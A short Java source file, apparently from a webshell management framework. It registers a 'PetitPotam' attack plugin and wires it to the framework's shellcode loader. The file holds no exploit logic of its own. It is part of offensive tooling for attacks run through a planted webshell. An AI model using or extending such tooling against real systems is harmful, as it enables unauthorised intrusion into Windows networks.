package shells.plugins.java;

import core.annotation.PluginAnnotation;

@PluginAnnotation(
   payloadName = "JavaDynamicPayload",
   Name = "PetitPotam",
   DisplayName = "PetitPotam"
)
public class PetitPotam extends shells.plugins.generic.PetitPotam {
   protected shells.plugins.generic.ShellcodeLoader getShellcodeLoader() {
      return (shells.plugins.generic.ShellcodeLoader)super.shellEntity.getFrame().getPlugin("ShellcodeLoader");
   }
}
